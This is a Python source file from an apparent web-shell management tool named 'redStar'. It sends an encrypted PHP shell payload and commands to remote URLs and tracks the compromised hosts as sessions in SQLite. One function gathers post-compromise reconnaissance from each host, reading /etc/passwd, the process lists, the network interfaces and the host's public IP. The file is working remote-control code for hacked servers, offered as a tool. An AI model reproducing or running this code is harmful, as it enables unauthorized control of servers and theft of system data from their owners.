import sqlite3
import requests
import hashlib
import threading
from prettytable import PrettyTable

#IMPORT REDSTAR
from redStar.shellCreator import *   
from redStar.util import *

lock = 0

class shellManagement:
	url = ""
	key = ""


	def checkLocal(url,key):
		sql = '''SELECT * FROM sessions WHERE url = ?'''
		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor() 
		data = (url,)
		row_count = len(cur.execute(sql,data).fetchall())
		if(row_count != 0):
			print(f"{Fore.RED}[*] Already exists in database{Style.RESET_ALL}")
			return False

		c = shellManagement.executeCommand(url,key,"echo 'True'")

		if(isinstance(c,str)):
			print(f"{Fore.GREEN}[*] Successfully added '"+str(url)+f'\'{Style.RESET_ALL}')
			return True
		elif(c==-12):
			print(f"{Fore.RED}[-] Decryption Error, Check Key{Style.RESET_ALL}")
			return False
		elif(c==-11):
			print(f"{Fore.RED}[-] Host Not Reachable{Style.RESET_ALL}")
			return False
		elif(c==-10):
			print(f"{Fore.RED}[-] Endpoint Not Reachable{Style.RESET_ALL}")
			return False

		else:
			print(f"{Fore.RED}[-] Unknown Err{Style.RESET_ALL}")
			return False


	def check(url,key):
		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor()
		sql = ' SELECT * FROM sessions WHERE url=? AND key=?'
		data = (url,key)
		sessionData = cur.execute(sql,data).fetchall()
		cur.close() 
	 
		try:
			test = shellManagement.executeCommand(sessionData[0][2],sessionData[0][3],"echo 'ok'")
		except:
			return False
		if(test==-11):
			print(f"{Fore.RED}[-] Host Not Reachable{Style.RESET_ALL}")
			return False
		elif(test==-10):
			print(f"{Fore.RED}[-] Endpoint Not Reachable{Style.RESET_ALL}")
			return False
		elif(test==-12):
			print(f"{Fore.RED}[-] Decryption Error{Style.RESET_ALL}") # This seems interesting
			return False
		elif(isinstance(test,int)):
			print(f"{Fore.RED}[-] Unknown Error {Style.RESET_ALL}")
			return False

		test = test.replace("\n","")
		if(test=="ok"):
			return True
		else:
			return False

	def addNewEndPoint(url,key):
		global conn 
		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor()
		id = str(uuid.uuid4()).replace("-","")[:12].upper()

		# is it possible ?
		sql = '''SELECT * FROM sessions WHERE session_id=?'''
		data = (str(id),)
		exists = len(cur.execute(sql, data).fetchall())
		if (exists!=0):
			addNewEndPoint(url,key)
			return



		
		t = time.localtime()
		current_time = time.strftime("%H:%M:%S %d-%m-%Y", t)

		sql = '''INSERT INTO sessions(session_id,url,key,last_seen)  VALUES( ?, ?, ?, ?)'''
		
		data = (str(id),str(url),str(key),current_time)
		cur.execute(sql, data)
		conn.commit()

		#shellManagement.logThreadSpawn(url,key,id)



		
	def executeCommand(url,key,cmd):
		t = key
		custom_shell = open("redStar/phpWebShell/customShell.php","r")
		shellcont = custom_shell.read()
		shell = shellCreator()
		req1 = shell.encrypt(shellcont,str(key))
		result = hashlib.md5(key.encode()) 
		for x in range(1,100000):
			result = hashlib.md5(result.hexdigest().encode()) 
		key = result.hexdigest().encode() 

		try:
			r = requests.post(str(url),data={'redStar':str(req1.decode('utf-8')),'red':cmd},headers={'redStar':str(key.decode('utf-8'))})
			if(r.status_code == 404): 
				return -10 # Endpoint not found
			try:
				xx = shell.decrypt(r.text,str(t))
			except:
				return -12 # Decryption error
			return xx # works normally
		except:
			return -11 # Host not reachable


	def logThreadSpawn(url,key,id):
		#Fetch logs
		threading.Thread(target=shellManagement.getLogFromSV, args=(url,key,id)).start()
		#while lock:
		#	a = ["-", "\\", "|", "/"] 
		#	for i in range(4): 
		#			print("\r[+] Please Wait " + a[i], end ="")  
		#print("")


	def getLogFromSV(url,key,session_id):
		

 
		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor()

		sql = '''SELECT session_id FROM logs WHERE session_id=?'''
		data = (session_id,)
		checkIfExists= len(cur.execute(sql, data).fetchall())

		if(checkIfExists!=0):
			#Delete old log
			sql = '''DELETE FROM logs WHERE session_id=?'''
			data = (session_id,)
			cur.execute(sql, data)

		user_id = shellManagement.executeCommand(url,key,"id")
		user_pwd = shellManagement.executeCommand(url,key,"pwd")
		user_ps = shellManagement.executeCommand(url,key,"ps -aux")
		user_passwdFile = shellManagement.executeCommand(url,key,"cat /etc/passwd")
		user_localIp = shellManagement.executeCommand(url,key,"ip a")
		user_svIp = shellManagement.executeCommand(url,key,"curl icanhazip.com")

		t = time.localtime()
		current_time = time.strftime("%H:%M:%S %Y", t)

		sql = '''INSERT INTO logs (session_id,user_id,pwd,ps,passwd_file,local_ip,sv_ip,log_time) VALUES( ?, ?, ?, ?, ?, ?, ?, ?)'''
		data = (str(session_id),user_id,user_pwd,user_ps,user_passwdFile,user_localIp,user_svIp,current_time)
		cur.execute(sql, data)
		conn.commit()
		cur.close()
 

	def getSessions():

		conn = sqlite3.connect('sessions/redStar.db')
		cur = conn.cursor()
		sql = '''SELECT * FROM sessions'''
		sess = cur.execute(sql).fetchall() 
		cur.close()
	 			

		t = PrettyTable(['SESSION_ID', 'URL','CREATED_TIME'])	
		t.align = "l"
		for x in range(0,len(sess)):
			t.add_row([sess[x][1], sess[x][2],sess[x][4]]) 
		print(t)